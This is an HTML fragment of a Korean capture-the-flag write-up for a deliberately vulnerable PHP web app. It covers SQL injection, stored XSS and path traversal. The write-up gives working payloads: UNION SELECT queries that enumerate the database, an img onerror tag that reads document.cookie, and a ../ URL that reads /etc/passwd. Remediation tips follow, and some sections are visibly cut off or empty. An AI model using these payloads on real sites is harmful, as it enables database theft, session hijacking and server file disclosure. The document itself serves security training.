<h3 id="05-member-sql-injection"><a class="heading-link" aria-hidden="true" href="#05-member-sql-injection">05. Member SQL Injection</a></h3>
<p><strong>경로</strong>: <code>/index.php?page=member</code></p>
<p><strong>설명</strong>:
회원 ID에 따라 회원 정보를 표시하는 페이지에서 SQL 인젝션 공격을 통해 데이터베이스 정보를 추출해야 한다.</p>
<p><strong>플래그 획득 방법</strong>:</p>
<ol>
<li>
<p><strong>MySQL 지문 인식</strong>:</p>
<ul>
<li>작은따옴표(<code>'</code>) 입력하여 에러 메시지 확인</li>
<li>또는 <code>1 /*! and 1=0 */</code> 입력 (MySQL만 해석)</li>
</ul>
</li>
<li>
<p><strong>버전 확인</strong>:</p>
<pre><code>1 AND 1=0 UNION SELECT 1, version()
</code></pre>
<ul>
<li>결과: 5.5.44</li>
</ul>
</li>
<li>
<p><strong>데이터베이스, 스키마, 테이블 목록 확인</strong>:</p>
<pre><code>1 AND 1=0 UNION SELECT 1, DATABASE()

1 AND 1=0 UNION SELECT 1, column_name FROM information_schema.columns WHERE table_schema=DATABASE()
</code></pre>
<ul>
<li>결과:
<ul>
<li>DB/Schema: <code>Member_Sql_Injection</code></li>
<li>테이블: <code>users</code></li>

</ul>
</li>
</ul>
</li>
<li>
<p><strong>플래그 찾기</strong>:</p>

</code></pre>

</ul>
</li>
</ol>
<p><strong>취약점</strong>:
공격자가 데이터베이스의 모든 데이터를 가져올 수 있음</p>
<p><strong>해결 방법</strong>:</p>

<li>데이터베이스 지문 인식: 에러 메시지 표시하지 않기</li>
<li>사용자 제공 데이터로 쿼리 구성하지 않기. PHP의 경우 PDO 사용</li>

<h3 id="07-feedback-xss"><a class="heading-link" aria-hidden="true" href="#07-feedback-xss">07. Feedback XSS</a></h3>
<p><strong>경로</strong>: <code>/index.php?page=feedback</code></p>
<p><strong>설명</strong>:
피드백 페이지에서 저장된 XSS(Cross-Site Scripting) 공격을 수행해야 한다. 서버는 <code>&#x3C;script></code> 태그를 제외한 HTML 태그를 체크하지 않는다.</p>
<p><strong>플래그 획득 방법</strong>:
이름 입력 필드에 다음 값을 입력:</p>
<pre><code>alert
&#x3C;img src='aaa' onerror="alert(document.cookie)">
</code></pre>
<p><strong>취약점</strong>:
저장된 XSS는 가장 위험한 유형의 XSS다. 데이터 저장을 허용하는 웹 애플리케이션은 이 공격에 취약할 수 있다.</p>
<p>이 취약점은 다음과 같은 브라우저 기반 공격에 사용될 수 있습니다:</p>
<ul>
<li>다른 사용자의 브라우저 하이재킹</li>
<li>애플리케이션 사용자가 본 민감한 정보 캡처</li>
<li>애플리케이션의 가짜 디페이스</li>
<li>내부 호스트의 포트 스캔</li>
<li>브라우저 기반 익스플로잇의 직접 전달</li>
<li>기타 악의적인 활동</li>
</ul>
<p><strong>해결 방법</strong>:
항상 사용자 입력을 검증하고 서버 출력을 필터링</p>
<p><strong>리소스</strong>:</p>
<ul>

<h3 id="10-etcpasswd"><a class="heading-link" aria-hidden="true" href="#10-etcpasswd">10. etc/passwd</a></h3>
<p><strong>경로</strong>: <code>/index.php?page=../../../../../../../etc/passwd</code></p>
<p><strong>설명</strong>:

<p><strong>플래그 획득 방법</strong>:

</code></pre>
<p>이 취약점을 악용하여 서버 측 파일, 특히 <code>/etc/passwd</code>를 탐색:</p>
<pre><code>/index.php?page=../../../../../../../etc/passwd
</code></pre>
<p><strong>취약점</strong>:
공격자가 서버의 모든 파일에 접근할 수 있음</p>
<p><strong>해결 방법</strong>:
서버 폴더 탐색을 허용하지 않기. 모든 페이지 파일이 특정 폴더 아래에 있도록 설정</p>
